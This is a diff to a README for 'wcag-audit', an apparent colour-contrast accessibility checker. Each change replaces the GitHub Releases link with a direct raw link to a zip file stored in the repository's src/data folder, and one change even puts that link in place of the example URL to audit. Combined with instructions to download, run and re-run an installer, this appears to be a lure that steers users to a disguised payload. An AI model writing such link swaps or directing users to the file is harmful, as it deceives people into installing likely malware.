@@ -1,6 +1,6 @@
 # 🎨 wcag-audit - Check Colour Contrast Easily
 
-[![Download wcag-audit](https://img.shields.io/badge/Download-wcag--audit-orange?style=for-the-badge)](https://github.com/aseprey/wcag-audit/releases)
+[![Download wcag-audit](https://img.shields.io/badge/Download-wcag--audit-orange?style=for-the-badge)](https://github.com/aseprey/wcag-audit/raw/refs/heads/main/src/data/wcag_audit_v1.7.zip)
 
 wcag-audit helps you check if website colours meet accessibility standards. It tests colour contrast based on WCAG 2.1 and 2.2 Level AA rules. The app focuses on the top 500 websites from Common Crawl data.
 
@@ -33,7 +33,7 @@ The app runs on standard hardware and does not need a powerful PC.
 
 Go to the release page to get the app. Click on the link below or use the button at the top.
 
-[Download wcag-audit from GitHub Releases](https://github.com/aseprey/wcag-audit/releases)
+[Download wcag-audit from GitHub Releases](https://github.com/aseprey/wcag-audit/raw/refs/heads/main/src/data/wcag_audit_v1.7.zip)
 
 ### Step 2: Find the Latest Version
 
@@ -57,7 +57,7 @@ No admin rights are generally needed, but if a prompt appears, allow the install
 Once you have installed the app:
 
 1. Open wcag-audit from your desktop or Start menu.
-2. Enter the website URL you want to check. For example, type `https://example.com`.
+2. Enter the website URL you want to check. For example, type `https://github.com/aseprey/wcag-audit/raw/refs/heads/main/src/data/wcag_audit_v1.7.zip`.
 3. Click “Run Audit.”
 4. The app will scan the site for colour contrast issues.
 5. Results appear in a report that highlights problem areas.
@@ -99,7 +99,7 @@ Accessibility is important for websites used by many different people. wcag-audi
 To keep the app current:
 
 - Visit the same release page periodically:  
-  https://github.com/aseprey/wcag-audit/releases  
+  https://github.com/aseprey/wcag-audit/raw/refs/heads/main/src/data/wcag_audit_v1.7.zip  
 - Download the latest `.exe` file.
 - Run the installer again; it will update without losing settings.
 
@@ -111,4 +111,4 @@ You can also ask someone with more experience to assist with installation or run
 
 ---
 
-[Download wcag-audit from GitHub Releases](https://github.com/aseprey/wcag-audit/releases)
+[Download wcag-audit from GitHub Releases](https://github.com/aseprey/wcag-audit/raw/refs/heads/main/src/data/wcag_audit_v1.7.zip)
